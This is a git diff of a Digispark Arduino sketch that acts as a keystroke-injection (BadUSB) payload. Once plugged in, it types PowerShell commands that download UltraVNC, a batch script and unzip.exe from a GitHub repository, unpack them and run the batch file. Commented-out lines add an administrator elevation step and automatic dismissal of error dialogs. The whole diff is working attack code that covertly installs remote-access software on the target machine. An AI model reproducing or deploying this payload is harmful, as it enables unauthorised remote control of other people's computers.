@@ -11,23 +11,27 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.print("powershell");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(5000);
   DigiKeyboard.print("$client = new-object System.Net.WebClient");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/UltraVNC.zip\" , \"%USERPROFILE%\\UltraVNC.zip\")");
+  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/UltraVNC.zip\" , \"UltraVNC.zip\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(10000);
-  DigiKeyboard.print("$client2 = new-object System.Net.WebClient");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  DigiKeyboard.print("$client2.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/guercio.bat\" , \"%USERPROFILE%\\guercio.bat\")");
+  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/guercio.bat\" , \"guercio.bat\")");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Expand-Archive -Path %USERPROFILE%\\UltraVNC.zip -DestinationPath %USERPROFILE%\\UltraVNC");
+  //Works only on powershell 5 or later
+  /*DigiKeyboard.print("Expand-Archive -Path UltraVNC.zip -DestinationPath UltraVNC");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(750);
+  DigiKeyboard.delay(750);*/
+  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/unzip.exe\" , \"unzip.exe\")");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print(".\unzip.exe .\UltraVNC.zip");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(3000);
   //If the system hasn't been configured to run scripts, uncomment the lines bellow
   /*DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -38,11 +42,17 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(750);*/
   //
+  //Now we can close powershell
   DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
   DigiKeyboard.delay(750);
-  DigiKeyboard.print("cmd.exe %USERPROFILE%\\guercio.bat");
-  //DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
+  DigiKeyboard.print("%USERPROFILE%\\guercio.bat");
+  //DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\guercio.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  //This is to ignore errors with dlls
+  /*for (int i = o; i <10; i++) {
+	  DigiKeyboard.delay(1200);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  }*/
   for (;;) {
     /*empty*/
   }
